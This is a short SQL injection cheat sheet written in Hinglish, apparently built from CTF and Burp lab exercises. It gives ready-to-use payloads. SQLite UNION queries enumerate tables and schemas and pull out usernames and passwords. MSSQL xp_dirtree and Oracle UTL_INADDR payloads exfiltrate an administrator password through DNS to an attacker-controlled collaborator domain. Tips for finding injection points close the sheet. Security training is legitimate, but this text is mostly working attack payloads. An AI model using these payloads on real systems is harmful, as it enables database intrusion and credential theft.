# SQL Injection — Payloads & Techniques

## 1. SQLite Injection

```sql
'Union Select sqlite_version()'
```
Use case: Confirm karo DB SQLite hai aur injection point kaam kar raha hai.

```sql
' Union Select Group_Concat(name) FROM sqlite_master Where type='table' AND '1'='1
```
Use case: Database ke saare table names ek saath nikalo.

```sql
' Union Select sql FROM sqlite_master Where type='table' AND name='admintable
```
Use case: Specific table ka schema (structure) dekho.

```sql
'Union Select group_concat(username) FROM admintable '
'Union Select password from admintable Where username='TryHackMeAdmin
'Union Select password from admintable Where username='flag
```
Use case: Specific column/row ka data extract karna (usernames, passwords, flags).

---

## 2. Blind SQLi — Out-of-Band Exfiltration (MSSQL + Oracle)

### MSSQL (xp_dirtree trick)
```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
Use case: Jab direct response na mile (blind SQLi), to data ko DNS lookup ke through apne Burp Collaborator (ya out-of-band server) tak bhej do. Password automatically subdomain bankar DNS request mein chala jata hai.

### Oracle (UTL_INADDR trick)
```sql
'union SELECT UTL_INADDR.get_host_address((select username || '-' || password from users where username='administrator')||'.exfsqpf832grf8zyf8u6bksdz45wtwhl.oastify.com') from dual--
```
Use case: Same concept Oracle DB ke liye — DNS resolution function ko abuse karke data exfiltrate karo.

> **Concept:** In dono techniques mein attacker response directly nahi dekh pata, lekin apne controlled DNS/collaborator server ke logs mein incoming request (jisme data embedded hai) dekh leta hai.

---

## 3. Quick Tips
- Pehle `'` (single quote) daal ke error trigger karne ki koshish karo — agar error aaye to injection point confirm.
- `UNION SELECT` tab kaam karta hai jab columns ki tadaad match ho (`ORDER BY` se pehle count karo).
- Blind/out-of-band tab use karo jab response mein kuch na dikhe.
